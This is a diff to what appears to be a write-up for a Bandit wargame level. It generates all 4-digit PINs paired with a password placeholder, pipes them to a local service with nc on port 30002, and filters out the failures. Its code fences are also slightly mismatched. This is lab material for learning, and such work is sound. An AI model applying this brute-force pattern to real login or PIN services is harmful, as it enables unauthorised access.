@@ -9,15 +9,19 @@ You do not need to create new connections each time
 cd $(mktemp -d)
 ```
 
-```
+````bash
 # all 4 digit numbers
-echo {0..9}{0..9}{0..9}{0..9} | tr ' ' '\n' >> pw.txt
+for i in {0..9}{0..9}{0..9}{0..9}; do
+  echo "<bandit24_password> $i"
+done > pw.txt
 ```
 
-```
+```bash
 cat pw.txt | nc localhost 30002 >> results.txt
 ```
 
-```
+```bash
 grep -v -i wrong results.txt
 ```
+
+````
